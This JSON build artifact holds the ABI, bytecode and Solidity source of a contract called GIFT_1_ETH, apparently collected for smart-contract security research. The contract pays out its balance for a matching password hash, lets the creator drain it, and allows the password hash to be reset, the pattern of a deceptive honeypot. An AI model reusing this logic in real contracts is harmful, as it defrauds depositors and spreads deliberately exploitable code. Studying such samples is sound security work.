{
  "contractName": "GIFT_1_ETH",
  "abi": [
    {
      "constant": true,
      "inputs": [],
      "name": "hashPass",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "constant": true,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetHash",
      "outputs": [
        {
          "name": "",
          "type": "bytes32"
        }
      ],
      "payable": false,
      "stateMutability": "view",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "SetPass",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "pass",
          "type": "bytes"
        }
      ],
      "name": "GetGift",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "Revoce",
      "outputs": [],
      "payable": true,
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "constant": false,
      "inputs": [
        {
          "name": "hash",
          "type": "bytes32"
        }
      ],
      "name": "PassHasBeenSet",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040526000600160146101000a81548160ff02191690831515021790555034801561002b57600080fd5b506105048061003b6000396000f300608060405260043610610078576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680630a6fbb051461007a578063181ffc5f1461009e57806331fd725a146100cc57806387f24484146100fd578063b456ecc514610130578063cd8b02c8146101b5575b005b61009c60048036038101908080356000191690602001909291905050506101bf565b005b6100ca600480360381019080803590602001908201803590602001919091929391929390505050610253565b005b3480156100d857600080fd5b506100fb60048036038101908080356000191690602001909291905050506102f4565b005b34801561010957600080fd5b5061011261037d565b60405180826000191660001916815260200191505060405180910390f35b34801561013c57600080fd5b50610197600480360381019080803590602001908201803590602001908080601f0160208091040260200160405190810160405280939291908181526020018383808284378201915050505050509192919290505050610383565b60405180826000191660001916815260200191505060405180910390f35b6101bd6103ef565b005b600160149054906101000a900460ff161580156101e35750670de0b6b3a764000034115b806101f75750600060010260005460001916145b1561024957806000816000191690555033600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b4360028190555050565b4360025410151561026357600080fd5b8181604051808383808284378201915050925050506040518091039020600019166000546000191614156102f0573373ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156102ee573d6000803e3d6000fd5b505b5050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614801561035a5750600054600019168160001916145b1561037a5760018060146101000a81548160ff0219169083151502179055505b50565b60005481565b6000816040518082805190602001908083835b6020831015156103bb5780518252602082019150602081019050602083039250610396565b6001836020036101000a03801982511681845116808217855250505050505090500191505060405180910390209050919050565b436002541015156103ff57600080fd5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff1614156104d657600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166108fc3073ffffffffffffffffffffffffffffffffffffffff16319081150290604051600060405180830381858888f193505050501580156104d4573d6000803e3d6000fd5b505b5600a165627a7a72305820c073f46318f5b9d0bbafd9479e26ce503b268a3e55bacca016aabfd61baeb29a0029",
  "source": "\n\ncontract GIFT_1_ETH\n{\n    bytes32 public hashPass;\n    \n    address sender;\n\t\n\tbool passHasBeenSet = false;\n\t\n\tuint lastBlock;\n\t\n\tfunction() public payable{}\n    \n    function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}\n    \n    function SetPass(bytes32 hash)\n    public\n    payable\n    {\n        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )\n        {\n            hashPass = hash;\n            sender = msg.sender;\n        }\n        lastBlock = block.number;\n    }\n    \n    function GetGift(bytes pass)\n    external\n    payable\n    oneforblock\n    {\n        if(hashPass == keccak256(pass))\n        {\n            msg.sender.transfer(this.balance);\n        }\n    }\n    \n    function Revoce()\n    public\n    payable\n    oneforblock\n    {\n        if(msg.sender==sender)\n        {\n            sender.transfer(this.balance);\n        }\n    }\n    \n    function PassHasBeenSet(bytes32 hash)\n    public\n    {\n        if(msg.sender==sender&&hash==hashPass)\n        {\n           passHasBeenSet=true;\n        }\n    }\n    \n    modifier oneforblock\n    {\n        require(lastBlock<block.number);\n        _;\n    }\n    \n}",
  "sourcePath": "/home/XXX-1/smartrim-experiment/for-rlf/0x6594ac0a2ba54885ff7d314eb27c9694cb25698b/contracts/0x6594ac0a2ba54885ff7d314eb27c9694cb25698b.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.25+commit.59dbf8f1.Emscripten.clang"
  },
  "schemaVersion": "3.4.16",
  "updatedAt": "2025-08-14T03:56:13.737Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}